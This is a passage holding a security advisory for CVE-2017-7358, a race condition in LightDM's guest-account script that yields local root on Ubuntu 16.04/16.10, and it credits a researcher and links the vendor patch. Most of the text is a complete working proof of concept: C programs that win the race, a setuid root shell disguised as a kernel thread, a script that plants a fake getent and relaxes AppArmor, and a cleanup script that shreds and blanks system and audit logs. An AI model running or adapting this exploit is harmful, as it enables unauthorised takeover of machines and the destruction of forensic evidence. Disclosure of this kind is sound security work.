@@ -1,0 +1,456 @@
+Source: https://blogs.securiteam.com/index.php/archives/3134
+
+Vulnerability Summary
+The following advisory describes a local privilege escalation via LightDM
+found in Ubuntu versions 16.10 / 16.04 LTS.
+
+Ubuntu is an open source software platform that runs everywhere from IoT
+devices, the smartphone, the tablet and the PC to the server and the
+cloud. LightDM is an X display manager that aims to be lightweight, fast,
+extensible and multi-desktop. It uses various front-ends to draw login
+interfaces, also called Greeters.
+
+
+Credit
+An independent security researcher, G. Geshev (@munmap), has reported this
+vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program
+
+
+Vendor Responses
+The vendor has released a patch to address this issue.
+For more information: https://www.ubuntu.com/usn/usn-3255-1/
+
+
+CVE Details
+CVE-2017-7358 <https://nvd.nist.gov/vuln/detail/CVE-2017-7358>
+
+
+Vulnerability Details
+The vulnerability is found in *LightDM*, which is the Ubuntu’s default
+desktop manager, more specifically in the guest login feature. By default
+*LightDM* allows you to log into a session as a temporary user. This is
+implemented in a script called ‘*guest-account*‘.
+
+@ubuntu:~$ ls -l /usr/sbin/guest-account
+-rwxr-xr-x 1 root root 6516 Sep 29 18:56 /usr/sbin/guest-account
+
+@ubuntu:~$ dpkg -S /usr/sbin/guest-account
+lightdm: /usr/sbin/guest-account
+
+@ubuntu:~$ dpkg -s lightdm
+Package: lightdm
+Status: install ok installed
+Priority: optional
+Section: x11
+Installed-Size: 672
+Maintainer: Robert Ancell <robert.ancell@ubuntu.com>
+Architecture: amd64
+Version: 1.19.5-0ubuntu1
+Provides: x-display-manager
+Depends: debconf (>= 0.5) | debconf-2.0, libc6 (>= 2.14), libgcrypt20 (>=
+1.7.0), libglib2.0-0 (>= 2.39.4), libpam0g (>= 0.99.7.1), libxcb1, libxdmcp6
+, adduser, bash (>= 4.3), dbus, libglib2.0-bin, libpam-runtime (>= 0.76-14),
+libpam-modules, plymouth (>= 0.8.8-0ubuntu18)
+Pre-Depends: dpkg (>= 1.15.7.2)
+Recommends: xserver-xorg, unity-greeter | lightdm-greeter | lightdm-kde-
+greeter
+Suggests: bindfs
+Conflicts: liblightdm-gobject-0-0, liblightdm-qt-0-0
+Conffiles:
+/etc/apparmor.d/abstractions/lightdm a715707411c3cb670a68a4ad738077bf
+/etc/apparmor.d/abstractions/lightdm_chromium-browser
+e1195e34922a67fa219b8b95eaf9c305
+/etc/apparmor.d/lightdm-guest-session 3c7812f49f27e733ad9b5d413c4d14cb
+/etc/dbus-1/system.d/org.freedesktop.DisplayManager.conf
+b76b6b45d7f7ff533c51d7fc02be32f4
+/etc/init.d/lightdm be2b1b20bec52a04c1a877477864e188
+/etc/init/lightdm.conf 07304e5b3265b4fb82a2c94beb9b577e
+/etc/lightdm/users.conf 1de1a7e321b98e5d472aa818893a2a3e
+/etc/logrotate.d/lightdm b6068c54606c0499db9a39a05df76ce9
+/etc/pam.d/lightdm 1abe2be7a999b42517c82511d9e9ba22
+/etc/pam.d/lightdm-autologin 28dd060554d1103ff847866658431ecf
+/etc/pam.d/lightdm-greeter 65ed119ce8f4079f6388b09ad9d8b2f9
+Description: Display Manager
+LightDM is a X display manager that:
+  * Has a lightweight codebase
+  * Is standards compliant (PAM, ConsoleKit, etc)
+  * Has a well defined interface between the server and user interface
+  * Cross-desktop (greeters can be written in any toolkit)
+Homepage: https://launchpad.net/lightdm
+
+@ubuntu:~$
+
+The script runs as root when you view the login screen, also known as a
+greeter, to log in as a guest. Ubuntu’s default greeter is Unity Greeter.
+
+
+*Vulnerable code*
+
+The vulnerable function is ‘*add_account*‘.
+
+35   temp_home=$(mktemp -td guest-XXXXXX)
+36   GUEST_HOME=$(echo ${temp_home} | tr '[:upper:]' '[:lower:]')
+37   GUEST_USER=${GUEST_HOME#/tmp/}
+38   [ ${GUEST_HOME} != ${temp_home} ] && mv ${temp_home} ${GUEST_HOME}
+
+The guest folder gets created using ‘mktemp’ on line 35. The attacker can
+use ‘*inotify*‘ to monitor ‘*/tmp*‘ for the creation of this folder.
+
+The folder name will likely contain both upper and lower case letters. Once
+this folder is created, we grab the folder name and quickly and create the
+equivalent folder with all letters lower case.
+
+If we manage to race the ‘*mv*‘ command on line 38, we end up with the
+newly created home for the guest user inside the folder we own.
+
+Once we have the guest home under our control, we rename it and replace it
+with a *symbolic link* to a folder we want to take over. The code below
+will then add the new user to the OS. The user’s home folder will already
+point to the folder we want to take over, for example ‘*/usr/local/sbin*‘.
+
+68    useradd --system --home-dir ${GUEST_HOME} --comment $(gettext "Guest")
+--user-group --shell /bin/bash ${GUEST_USER} || {
+69      rm -rf ${GUEST_HOME}
+70      exit 1
+71    }
+
+The attacker can grab the newly created user’s ID and monitor ‘
+*/usr/local/sbin*‘ for ownership changes. The ownership will be changed by
+the following ‘*mount*‘.
+
+78  mount -t tmpfs -o mode=700,uid=${GUEST_USER} none ${GUEST_HOME} || {
+79    rm -rf ${GUEST_HOME}
+80    exit 1
+81  }
+
+We will remove the symbolic link and create a folder with the same name –
+to let the guest user to log in. While the guest is logging in, his path
+for finding executable files will include ‘*bin*‘ under his home folder.
+
+That’s why we create a new symbolic link to point his ‘*bin*‘ into a folder
+we control. This way we can force the user to execute our own code under
+his user ID. We use this to log out the guest user from his session which
+is where we can gain root access.
+
+The logout code will first execute the following code:
+
+156  PWENT=$(getent passwd ${GUEST_USER}) || {
+157    echo "Error: invalid user ${GUEST_USER}"
+158    exit 1
+159  }
+
+This code will be executed as the owner of the script, i.e. root. Since we
+have already taken over ‘*/usr/local/sbin*‘ and have planted our own ‘
+*getent*‘, we get to execute commands as root at this point.
+
+Note – We can trigger the guest session creation script by entering the
+following two commands.
+
+XDG_SEAT_PATH="/org/freedesktop/DisplayManager/Seat0" /usr/bin/dm-tool lock
+XDG_SEAT_PATH="/org/freedesktop/DisplayManager/Seat0" /usr/bin/dm-tool
+switch-to-guest
+
+
+Proof of Concept
+
+The Proof of Concept is contains 9 files and they will take advantage of
+the race conditions mentioned above.
+
+   1. kodek/bin/cat
+   2. kodek/shell.c
+   3. kodek/clean.sh
+   4. kodek/run.sh
+   5. kodek/stage1.sh
+   6. kodek/stage1local.sh
+   7. kodek/stage2.sh
+   8. kodek/boclocal.c
+   9. kodek/boc.c
+
+By running the following scripts an attacker can run root commands:
+
+@ubuntu:/var/tmp/kodek$ ./stage1local.sh
+
+@ubuntu:/var/tmp/kodek$
+[!] GAME OVER !!!
+[!] count1: 2337 count2: 7278
+[!] w8 1 minute and run /bin/subash
+
+@ubuntu:/var/tmp/kodek$ /bin/subash
+root@ubuntu:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@ubuntu:~#
+
+If the exploit fails, you can simply run it again.
+
+Once you get your root shell, you can optionally clean any exploit files
+and logs by executing the below.
+
+root@ubuntu:/var/tmp/kodek# ./clean.sh
+/usr/bin/shred: /var/log/audit/audit.log: failed to open for writing: No such
+file or directory
+Do you want to remove exploit (y/n)?
+y
+/usr/bin/shred: /var/tmp/kodek/bin: failed to open for writing: Is a
+directory
+
+root@ubuntu:/var/tmp/kodek#
+
+boc.c
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <ctype.h>
+#include <sys/inotify.h>
+#include <sys/stat.h>
+#include <pwd.h>
+#define EVENT_SIZE(sizeof(struct inotify_event))
+#define EVENT_BUF_LEN(1024 * (EVENT_SIZE + 16))
+int main(void) {
+  struct stat info;
+  struct passwd * pw;
+  struct inotify_event * event;
+  pw = getpwnam("root");
+  if (pw == NULL) exit(0);
+  char newpath[20] = "old.";
+  int length = 0, i, fd, wd, count1 = 0, count2 = 0;
+  int a, b;
+  char buffer[EVENT_BUF_LEN];
+  fd = inotify_init();
+  if (fd < 0) exit(0);
+  wd = inotify_add_watch(fd, "/tmp/", IN_CREATE | IN_MOVED_FROM);
+  if (wd < 0) exit(0);
+  chdir("/tmp/");
+  while (1) {
+    length = read(fd, buffer, EVENT_BUF_LEN);
+    if (length > 0) {
+      event = (struct inotify_event * ) buffer;
+      if (event - > len) {
+        if (strstr(event - > name, "guest-") != NULL) {
+          for (i = 0; event - > name[i] != '\0'; i++) {
+            event - > name[i] = tolower(event - > name[i]);
+          }
+          if (event - > mask & IN_CREATE) mkdir(event - > name, ACCESSPERMS)
+;
+          if (event - > mask & IN_MOVED_FROM) {
+            rename(event - > name, strncat(newpath, event - > name, 15));
+            symlink("/usr/local/sbin/", event - > name);
+            while (1) {
+              count1 = count1 + 1;
+              pw = getpwnam(event - > name);
+              if (pw != NULL) break;
+            }
+            while (1) {
+              count2 = count2 + 1;
+              stat("/usr/local/sbin/", & info);
+              if (info.st_uid == pw - > pw_uid) {
+                a = unlink(event - > name);
+                b = mkdir(event - > name, ACCESSPERMS);
+                if (a == 0 && b == 0) {
+                  printf("\n[!] GAME OVER !!!\n[!] count1: %i count2: %i\n",
+count1, count2);
+                } else {
+                  printf("\n[!] a: %i b: %i\n[!] exploit failed !!!\n", a, b
+);
+                }
+                system("/bin/rm -rf /tmp/old.*");
+                inotify_rm_watch(fd, wd);
+                close(fd);
+                exit(0);
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+
+boclocal.c
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <ctype.h>
+#include <sys/inotify.h>
+#include <sys/stat.h>
+#include <pwd.h>
+#define EVENT_SIZE(sizeof(struct inotify_event))
+#define EVENT_BUF_LEN(1024 * (EVENT_SIZE + 16))
+int main(void) {
+  struct stat info;
+  struct passwd * pw;
+  struct inotify_event * event;
+  pw = getpwnam("root");
+  if (pw == NULL) exit(0);
+  char newpath[20] = "old.";
+  int length = 0, i, fd, wd, count1 = 0, count2 = 0;
+  int a, b, c;
+  char buffer[EVENT_BUF_LEN];
+  fd = inotify_init();
+  if (fd < 0) exit(0);
+  wd = inotify_add_watch(fd, "/tmp/", IN_CREATE | IN_MOVED_FROM);
+  if (wd < 0) exit(0);
+  chdir("/tmp/");
+  while (1) {
+    length = read(fd, buffer, EVENT_BUF_LEN);
+    if (length > 0) {
+      event = (struct inotify_event * ) buffer;
+      if (event - > len) {
+        if (strstr(event - > name, "guest-") != NULL) {
+          for (i = 0; event - > name[i] != '\0'; i++) {
+            event - > name[i] = tolower(event - > name[i]);
+          }
+          if (event - > mask & IN_CREATE) mkdir(event - > name, ACCESSPERMS)
+;
+          if (event - > mask & IN_MOVED_FROM) {
+            rename(event - > name, strncat(newpath, event - > name, 15));
+            symlink("/usr/local/sbin/", event - > name);
+            while (1) {
+              count1 = count1 + 1;
+              pw = getpwnam(event - > name);
+              if (pw != NULL) break;
+            }
+            while (1) {
+              count2 = count2 + 1;
+              stat("/usr/local/sbin/", & info);
+              if (info.st_uid == pw - > pw_uid) {
+                a = unlink(event - > name);
+                b = mkdir(event - > name, ACCESSPERMS);
+                c = symlink("/var/tmp/kodek/bin/", strncat(event - > name,
+"/bin", 5));
+                if (a == 0 && b == 0 && c == 0) {
+                  printf("\n[!] GAME OVER !!!\n[!] count1: %i count2:
+%i\n[!] w8 1 minute and run /bin/subash\n", count1, count2);
+                } else {
+                  printf("\n[!] a: %i b: %i c: %i\n[!] exploit failed
+!!!\n[!] w8 1 minute and run it again\n", a, b, c);
+                }
+                system("/bin/rm -rf /tmp/old.*");
+                inotify_rm_watch(fd, wd);
+                close(fd);
+                exit(0);
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+
+clean.sh
+
+#!/bin/bash
+if [ "$(/usr/bin/id -u)" != "0" ]; then
+   echo "This script must be run as root" 1>&2
+   exit 1
+fi
+/bin/rm -rf /tmp/guest-* /tmp/old.guest-*
+/usr/bin/shred -fu /var/tmp/run.sh /var/tmp/shell /var/tmp/boc /var/log/kern
+.log /var/log/audit/audit.log /var/log/lightdm/*
+/bin/echo > /var/log/auth.log
+/bin/echo > /var/log/syslog
+/bin/dmesg -c >/dev/null 2>&1
+/bin/echo "Do you want to remove exploit (y/n)?"
+read answer
+if [ "$answer" == "y" ]; then
+/usr/bin/shred -fu /var/tmp/kodek/* /var/tmp/kodek/bin/*
+/bin/rm -rf /var/tmp/kodek
+else
+exit
+fi
+
+run.sh
+
+#!/bin/sh
+/bin/cat << EOF > /usr/local/sbin/getent
+#!/bin/bash
+/bin/cp /var/tmp/shell /bin/subash >/dev/null 2>&1
+/bin/chmod 4111 /bin/subash >/dev/null 2>&1
+COUNTER=0
+while [ \$COUNTER -lt 10 ]; do
+/bin/umount -lf /usr/local/sbin/ >/dev/null 2>&1
+let COUNTER=COUNTER+1
+done
+/bin/sed -i 's/\/usr\/lib\/lightdm\/lightdm-guest-session
+{/\/usr\/lib\/lightdm\/lightdm-guest-session flags=(complain) {/g' /etc/
+apparmor.d/lightdm-guest-session >/dev/null 2>&1
+/sbin/apparmor_parser -r /etc/apparmor.d/lightdm-guest-session >/dev/null 2>
+&1
+/usr/bin/getent passwd "\$2"
+EOF
+/bin/chmod 755 /usr/local/sbin/getent >/dev/null 2>&1
+
+shell.c
+
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <grp.h>
+
+int main(void)
+{
+    setresuid(0, 0, 0);
+    setresgid(0, 0, 0);
+    setgroups(0, NULL);
+    putenv("HISTFILE=/dev/null");
+    execl("/bin/bash", "[bioset]", "-pi", NULL);
+    return 0;
+}
+
+stage1.sh
+
+#!/bin/bash
+if [ "${PWD}" == "/var/tmp/kodek" ]; then
+/usr/bin/killall -9 /var/tmp/boc >/dev/null 2>&1
+/usr/bin/killall -9 boc >/dev/null 2>&1
+/bin/sleep 3s
+/usr/bin/shred -fu /var/tmp/run.sh /var/tmp/shell /var/tmp/boc >/dev/null 2>
+&1
+/usr/bin/gcc boc.c -Wall -s -o /var/tmp/boc
+/usr/bin/gcc shell.c -Wall -s -o /var/tmp/shell
+/bin/cp /var/tmp/kodek/run.sh /var/tmp/run.sh
+/var/tmp/boc
+else
+echo "[!] run me from /var/tmp/kodek"
+exit
+fi
+
+stage1local.sh
+
+#!/bin/bash
+if [ "${PWD}" == "/var/tmp/kodek" ]; then
+/usr/bin/killall -9 /var/tmp/boc >/dev/null 2>&1
+/usr/bin/killall -9 boc >/dev/null 2>&1
+/bin/sleep 3s
+/usr/bin/shred -fu /var/tmp/run.sh /var/tmp/shell /var/tmp/boc >/dev/null 2>
+&1
+/usr/bin/gcc boclocal.c -Wall -s -o /var/tmp/boc
+/usr/bin/gcc shell.c -Wall -s -o /var/tmp/shell
+/bin/cp /var/tmp/kodek/run.sh /var/tmp/run.sh
+/var/tmp/boc &
+/bin/sleep 5s
+XDG_SEAT_PATH="/org/freedesktop/DisplayManager/Seat0" /usr/bin/dm-tool lock
+XDG_SEAT_PATH="/org/freedesktop/DisplayManager/Seat0" /usr/bin/dm-tool
+switch-to-guest
+else
+echo "[!] run me from /var/tmp/kodek"
+exit
+fi
+
+stage2.sh
+
+#!/bin/sh
+/usr/bin/systemd-run --user /var/tmp/run.sh
+
+/bin/cat
+
+#!/bin/sh
+/usr/bin/systemd-run --user /var/tmp/run.sh
+/bin/sleep 15s
+/bin/loginctl terminate-session `/bin/loginctl session-status | /usr/bin/
+head -1 | /usr/bin/awk '{ print $1 }'`
